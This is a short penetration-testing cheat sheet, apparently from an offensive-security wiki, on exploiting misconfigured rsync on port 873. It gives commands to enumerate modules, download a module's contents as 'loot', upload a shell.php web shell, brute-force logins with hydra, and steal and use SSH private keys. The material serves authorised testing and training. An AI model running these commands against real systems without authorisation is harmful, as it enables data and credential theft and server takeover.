# Rsync (873)

!!! tip "Start here"
    List modules anonymously: `rsync -av --list-only rsync://$IP`. If modules appear, pull them without credentials: `rsync -av rsync://$IP/<module> ./`. Look for SSH keys, config backups, and database dumps in what comes back.

---

## Enumeration

```bash
nmap -p 873 --script rsync-list-modules $IP
rsync -av --list-only rsync://$IP
```

---

## Download Files

```bash
# Entire module
rsync -av rsync://$IP/<module> ./loot/

# Single file
rsync -av rsync://$IP/<module>/path/to/file.txt ./
```

---

## Upload Files

If the module is writable:

```bash
rsync -av ./shell.php rsync://$IP/<module>/path/
```

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rsync://$IP
```

---

## SSH Key Theft

If home directories are exposed:

```bash
rsync -av rsync://$IP/<module>/home/user/.ssh/id_rsa ./
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```

!!! tip "Real-world"
    Rsync without authentication is a misconfiguration that mostly shows up on backup servers and internal infrastructure. Modules that expose `/home`, `/etc`, or application directories are high-value. Pull everything and grep offline. Write access to a web-accessible path is a direct shell upload.
